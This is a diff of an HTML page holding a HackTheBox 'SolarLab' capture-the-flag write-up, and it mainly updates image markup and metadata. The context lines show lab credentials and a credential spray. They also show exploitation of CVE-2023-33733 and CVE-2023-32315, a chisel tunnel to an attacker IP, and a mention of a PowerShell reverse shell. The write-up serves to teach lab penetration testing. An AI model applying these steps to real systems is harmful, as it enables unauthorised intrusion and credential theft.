@@ -333,6 +333,36 @@
     h1 { font-size: 2.4rem; }
   }
 </style>
+<script id="noctis-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: SolarLab",
+  "description": "HackTheBox SolarLab machine walkthrough — full writeup with screenshots.",
+  "datePublished": "2026-04-11",
+  "dateModified": "2026-04-11",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://sp1r4.github.io/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "NOCTIS",
+    "url": "https://sp1r4.github.io/"
+  },
+  "url": "https://sp1r4.github.io/writeups/htb-solarlab.html",
+  "image": "https://sp1r4.github.io/writeups/assets/og/htb-solarlab.svg",
+  "keywords": [
+    "hackthebox"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://sp1r4.github.io/blog.html#htb-solarlab"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
 </head>
 <body>
 <a href="../blog.html" class="writeup-back-link" style="position:fixed;top:18px;left:18px;z-index:9999;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;" onmouseover="this.style.transform='translateX(-2px)';this.style.background='rgba(26,26,24,1)'" onmouseout="this.style.transform='';this.style.background='rgba(26,26,24,0.92)'"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
@@ -386,21 +416,21 @@
   <h3>Nmap</h3>
   <p>Initial scan reveals HTTP, SMB, RPC ports on a Windows host. A full port scan additionally finds port <strong>6791</strong> running HTTP:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-01-3a6df53312.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Nmap initial scan results">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-02-a83cfc9a74.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Nmap full port scan showing port 6791">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-01-3a6df53312.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-01-3a6df53312.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Nmap initial scan results" width="700" height="190"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-02-a83cfc9a74.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-02-a83cfc9a74.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Nmap full port scan showing port 6791" width="640" height="217"></picture>
 
   <p>Add <code>solarlab.htb</code> to <code>/etc/hosts</code>:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-03-2313917de1.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="/etc/hosts with solarlab.htb">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-03-2313917de1.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-03-2313917de1.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="/etc/hosts with solarlab.htb" width="720" height="461"></picture>
 
   <h2>SMB Enumeration</h2>
   <p>Check SMB shares anonymously:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-04-bb4dafd837.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SMB share listing showing Documents share">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-04-bb4dafd837.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-04-bb4dafd837.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SMB share listing showing Documents share" width="720" height="222"></picture>
 
   <p>The <code>Documents</code> share is accessible. It contains several interesting files:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-05-ab38d061fe.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SMB Documents share contents">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-05-ab38d061fe.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-05-ab38d061fe.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SMB Documents share contents" width="720" height="310"></picture>
 
   <div class="terminal">
     <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">smbclient &#8212; download all</span></div>
@@ -409,12 +439,12 @@
 <span class="po">smb: \&gt; mget *</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-06-22f184f410.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Downloaded files: details-file.xlsx, old_leave_request_form.docx, etc.">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-06-22f184f410.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-06-22f184f410.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Downloaded files: details-file.xlsx, old_leave_request_form.docx, etc." width="720" height="221"></picture>
 
   <h3>details-file.xlsx</h3>
   <p>The Excel file contains usernames, passwords, security questions, and email addresses. Most useful entries:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-07-a3d61ab355.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="details-file.xlsx contents with credentials">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-07-a3d61ab355.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-07-a3d61ab355.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="details-file.xlsx contents with credentials" width="720" height="393"></picture>
 
   <div class="alert alert-info">
     Key credentials extracted:<br>
@@ -427,7 +457,7 @@
   <h2>Web Enumeration</h2>
   <p>Port 80 serves <strong>SolarLab IM</strong> — a coming-soon countdown page with no useful content:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-08-8b7923c0ff.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SolarLab IM website on port 80">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-08-8b7923c0ff.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-08-8b7923c0ff.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="SolarLab IM website on port 80" width="644" height="268"></picture>
 
   <h3>Subdomain brute-force</h3>
   <div class="terminal">
@@ -437,33 +467,33 @@
 <span class="pg">Found: report.solarlab.htb</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-09-01906c8e05.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Gobuster DNS finding report.solarlab.htb">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-09-01906c8e05.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-09-01906c8e05.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Gobuster DNS finding report.solarlab.htb" width="720" height="246"></picture>
 
   <p>Port <strong>6791</strong> also redirects automatically to <code>report.solarlab.htb</code>. Add it to <code>/etc/hosts</code>:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-10-8610dc64f5.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp showing unknown host error before adding to hosts">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-11-2910386743.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="/etc/hosts updated with report.solarlab.htb">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-10-8610dc64f5.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-10-8610dc64f5.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp showing unknown host error before adding to hosts" width="720" height="268"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-11-2910386743.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-11-2910386743.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="/etc/hosts updated with report.solarlab.htb" width="720" height="233"></picture>
 
   <h2>ReportHub &#8212; Credential Attack</h2>
   <p>Port 6791 serves a <strong>Login to ReportHub</strong> page:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-12-46fa5983c4.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="ReportHub login page">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-12-46fa5983c4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-12-46fa5983c4.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="ReportHub login page" width="720" height="372"></picture>
 
   <p>Testing the credentials from the xlsx — the error messages are specific. <code>User not found</code> vs <code>User authentication error</code> allows username enumeration. <code>AlexanderK</code> and <code>ClaudiaS</code> exist but passwords are wrong:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-13-bb7b6c91b4.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Login showing 'User not found' error">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-14-0699a0bb6c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Login showing 'User authentication error' — user exists">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-13-bb7b6c91b4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-13-bb7b6c91b4.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Login showing 'User not found' error" width="720" height="397"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-14-0699a0bb6c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-14-0699a0bb6c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Login showing 'User authentication error' — user exists" width="720" height="314"></picture>
 
   <h3>Burp Intruder &#8212; credential spray</h3>
   <p>Use Burp Intruder with a cluster bomb attack to mix and match usernames and passwords:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-15-d569ea6c8a.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp Intruder cluster bomb setup">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-16-cb275c8a83.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp payload sets with usernames and passwords">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-17-47a4840176.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp intruder results — no valid combinations found">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-15-d569ea6c8a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-15-d569ea6c8a.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp Intruder cluster bomb setup" width="720" height="388"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-16-cb275c8a83.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-16-cb275c8a83.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp payload sets with usernames and passwords" width="720" height="390"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-17-47a4840176.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-17-47a4840176.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp intruder results — no valid combinations found" width="720" height="181"></picture>
 
   <p>No valid credentials found in the first spray. Looking at the username pattern more carefully — <code>AlexanderK</code>, <code>ClaudiaS</code> — suggests <strong>First name + Last initial</strong>. The xlsx shows <code>blake.byte</code> so the username should be <strong>BlakeB</strong>:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-18-94fd0f4736.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="xlsx showing blake.byte with password ThisCanB3typedeasily1@">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-18-94fd0f4736.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-18-94fd0f4736.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="xlsx showing blake.byte with password ThisCanB3typedeasily1@" width="720" height="309"></picture>
 
   <div class="terminal">
     <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">Burp &#8212; BlakeB hit</span></div>
@@ -471,22 +501,22 @@
 <span class="pg">BlakeB : ThisCanB3typedeasily1@</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-19-f4bd3755c2.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp results showing BlakeB with length 660 — valid hit">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-19-f4bd3755c2.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-19-f4bd3755c2.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp results showing BlakeB with length 660 — valid hit" width="720" height="173"></picture>
 
   <div class="alert alert-success">Valid credentials: <strong>BlakeB:ThisCanB3typedeasily1@</strong></div>
 
   <h2>Foothold &#8212; CVE-2023-33733 (ReportLab RCE)</h2>
   <p>After logging in, ReportHub exposes four features — Leave Request, Training Request, Home Office Request, and Travel Approval. All generate PDFs:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-20-d48b82be28.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="ReportHub dashboard with four request options">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-21-8096f237b8.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Leave Request form with Generate PDF button">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-22-3554972358.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Generated PDF output from leave request">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-23-855607ead0.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Training Request form">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-20-d48b82be28.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-20-d48b82be28.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="ReportHub dashboard with four request options" width="720" height="323"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-21-8096f237b8.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-21-8096f237b8.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Leave Request form with Generate PDF button" width="720" height="368"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-22-3554972358.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-22-3554972358.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Generated PDF output from leave request" width="720" height="388"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-23-855607ead0.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-23-855607ead0.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Training Request form" width="720" height="348"></picture>
 
   <p>The PDF generator uses <strong>ReportLab</strong> which is vulnerable to <strong>CVE-2023-33733</strong> — HTML injection in the justification field leads to RCE via the PDF rendering engine:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-24-fdc1e5e2cf.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Google search showing CVE-2023-33733 ReportLab RCE">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-25-5489834759.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp request with CVE-2023-33733 payload injected into form field">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-24-fdc1e5e2cf.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-24-fdc1e5e2cf.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Google search showing CVE-2023-33733 ReportLab RCE" width="720" height="288"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-25-5489834759.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-25-5489834759.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Burp request with CVE-2023-33733 payload injected into form field" width="720" height="296"></picture>
 
   <p>Trigger a reverse shell via a PowerShell download cradle embedded in the exploit:</p>
 
@@ -503,9 +533,9 @@ Windows PowerShell running as user blake on SOLARLAB</span>
 <span class="pg">PS C:\Users\blake\Documents\app&gt;</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-26-d9dfe8ff1f.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Reverse shell received as blake on SOLARLAB">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-27-44df98227c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="whoami and whoami /priv showing blake's privileges">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-28-cf446f08c8.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="ipconfig and user.txt flag">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-26-d9dfe8ff1f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-26-d9dfe8ff1f.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Reverse shell received as blake on SOLARLAB" width="720" height="355"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-27-44df98227c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-27-44df98227c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="whoami and whoami /priv showing blake's privileges" width="720" height="326"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-28-cf446f08c8.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-28-cf446f08c8.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="ipconfig and user.txt flag" width="720" height="249"></picture>
 
   <div class="alert alert-success">&#128681; User flag captured as <strong>solarlab\blake</strong>.</div>
 
@@ -513,8 +543,8 @@ Windows PowerShell running as user blake on SOLARLAB</span>
   <h3>Credential discovery in app database</h3>
   <p>Inside <code>C:\Users\blake\Documents\app\instance</code>, there's a <code>users.db</code> SQLite file containing all application credentials:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-29-a4f17d9f8c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="users.db contents showing alexanderk, claudias, blakeb credentials">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-30-79a7f925de.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Credential summary: blakeb, alexanderk, claudias">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-29-a4f17d9f8c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-29-a4f17d9f8c.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="users.db contents showing alexanderk, claudias, blakeb credentials" width="614" height="227"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-30-79a7f925de.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-30-79a7f925de.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Credential summary: blakeb, alexanderk, claudias" width="720" height="191"></picture>
 
   <div class="terminal">
     <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">credentials from users.db</span></div>
@@ -526,14 +556,14 @@ Windows PowerShell running as user blake on SOLARLAB</span>
   <h3>Openfire — port forwarding</h3>
   <p>Checking active connections and the <code>C:\Users</code> directory reveals an <code>openfire</code> user and Openfire listening on <code>127.0.0.1:9090</code>:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-31-d32476d818.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="C:\Users showing Administrator, blake, openfire, Public">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-32-c4a28ad1e6.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Netstat showing Openfire on 127.0.0.1:9090">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-31-d32476d818.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-31-d32476d818.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="C:\Users showing Administrator, blake, openfire, Public" width="720" height="178"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-32-c4a28ad1e6.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-32-c4a28ad1e6.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Netstat showing Openfire on 127.0.0.1:9090" width="720" height="110"></picture>
 
   <p>WinPEAS confirms the credentials in <code>utils.py</code> and reveals nothing additional:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-33-d9fe825142.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="WinPEAS output showing hardcoded credentials in utils.py">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-34-1dc2ca3ae7.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="C:\Program Files showing Openfire and RUXIM directories">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-35-e668b0d56d.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Access denied when trying to cd into Openfire directory">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-33-d9fe825142.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-33-d9fe825142.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="WinPEAS output showing hardcoded credentials in utils.py" width="720" height="345"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-34-1dc2ca3ae7.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-34-1dc2ca3ae7.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="C:\Program Files showing Openfire and RUXIM directories" width="720" height="425"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-35-e668b0d56d.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-35-e668b0d56d.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Access denied when trying to cd into Openfire directory" width="720" height="115"></picture>
 
   <p>The Openfire directory is inaccessible as <code>blake</code> — we need the <code>openfire</code> user first. Forward port 9090 using chisel:</p>
 
@@ -547,13 +577,13 @@ Windows PowerShell running as user blake on SOLARLAB</span>
 <span class="po">PS C:\Users\blake\Documents\app&gt; .\chiselx86_64.exe client 10.10.14.63:1234 R:9090:127.0.0.1:9090</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-36-d9591573ce.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Chisel server running on Kali with session established">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-37-01d49b0819.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Chisel client on target connecting back">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-38-39cd44f527.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Openfire Administration Console login page on 127.0.0.1:9090">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-36-d9591573ce.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-36-d9591573ce.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Chisel server running on Kali with session established" width="720" height="373"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-37-01d49b0819.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-37-01d49b0819.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Chisel client on target connecting back" width="720" height="287"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-38-39cd44f527.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-38-39cd44f527.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Openfire Administration Console login page on 127.0.0.1:9090" width="720" height="155"></picture>
 
   <h3>CVE-2023-32315 &#8212; Openfire Auth Bypass</h3>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-39-7a1d77c41f.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Google search for Openfire RCE CVE-2023-32315">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-39-7a1d77c41f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-39-7a1d77c41f.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Google search for Openfire RCE CVE-2023-32315" width="720" height="304"></picture>
 
   <div class="terminal">
     <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">CVE-2023-32315 exploit</span></div>
@@ -564,14 +594,14 @@ Windows PowerShell running as user blake on SOLARLAB</span>
 <span class="pg">User added successfully: url: http://127.0.0.1:9090 username: m87vm2 password: ky4kb6</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-40-e0d0db175b.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="CVE-2023-32315 exploit output — new user added">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-40-e0d0db175b.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-40-e0d0db175b.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="CVE-2023-32315 exploit output — new user added" width="720" height="300"></picture>
 
   <p>Login with the newly created user, then upload the <code>openfire-management-tool-plugin.jar</code> plugin:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-41-c86e9a35bc.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Openfire admin dashboard after successful login">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-42-f46f814364.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Plugin upload page with openfire-management-tool-plugin.jar">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-43-68d714acc8.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Management tool login interface">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-44-71ce370ef5.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Management tool command execution — whoami showing solarlab\openfire">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-41-c86e9a35bc.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-41-c86e9a35bc.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Openfire admin dashboard after successful login" width="720" height="202"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-42-f46f814364.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-42-f46f814364.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Plugin upload page with openfire-management-tool-plugin.jar" width="693" height="270"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-43-68d714acc8.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-43-68d714acc8.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Management tool login interface" width="720" height="220"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-44-71ce370ef5.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-44-71ce370ef5.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Management tool command execution — whoami showing solarlab\openfire" width="720" height="149"></picture>
 
   <p>Execute a reverse shell via the management tool to get a proper shell as <code>openfire</code>:</p>
 
